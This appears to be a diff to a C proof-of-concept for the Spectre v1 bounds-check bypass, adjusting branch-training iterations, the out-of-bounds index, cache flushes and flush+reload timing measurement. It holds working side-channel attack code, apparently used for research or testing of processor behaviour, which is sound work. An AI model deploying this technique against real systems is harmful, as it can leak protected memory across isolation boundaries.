@@ -12,7 +12,7 @@
 // Threshhold, adjust to match machine
 #define THR 100
 
-#define TRAINING_ITERATIONS 5
+#define TRAINING_ITERATIONS 20
 
 // Limit for spectre v1 access
 #define ARRAY_SIZE 4
@@ -21,7 +21,7 @@ size_t limit = ARRAY_SIZE;
 void victim(size_t *index, uint8_t *fr_buf) {
     if (*index < limit) {
         // Perform array access
-        asm volatile("mov %0, %0" :: "r" (fr_buf[*index]));
+        maccess(&(fr_buf[*index]));
   }
 }
 
@@ -78,19 +78,20 @@ void speculate() {
 
     _mm_mfence();
 
-    // Set index to 0x20 for the attack (out-of-bounds)
-    *index = 0x20;
+    // Set index to 0x10 for the attack (out-of-bounds)
+    *index = 0x10;
     _mm_mfence();
 
     // Prepare attack
     _mm_clflush(&limit);
     _mm_clflush(index);
-    _mm_clflush(fr_buf + 0x20);
+    _mm_clflush(fr_buf + 0x10);
     _mm_mfence();
 
     // Call victim, which should speculate
     call_victim(index, fr_buf);
-    t = load_time(fr_buf + 0x20);
+    t = load_time(fr_buf + 0x10);
+    printf("%ld\n", t);
 
     if(t < THR) {
         hits++;
@@ -99,7 +100,7 @@ void speculate() {
     printf("Hits (Spectre):  %4ld/1\n", hits);
 
     munmap(index, 0x1000);
-    munmap(fr_buf, 0x1000 * 4);
+    munmap(fr_buf-0x2000, 0x1000 * 4);
 }
 
 int main() {
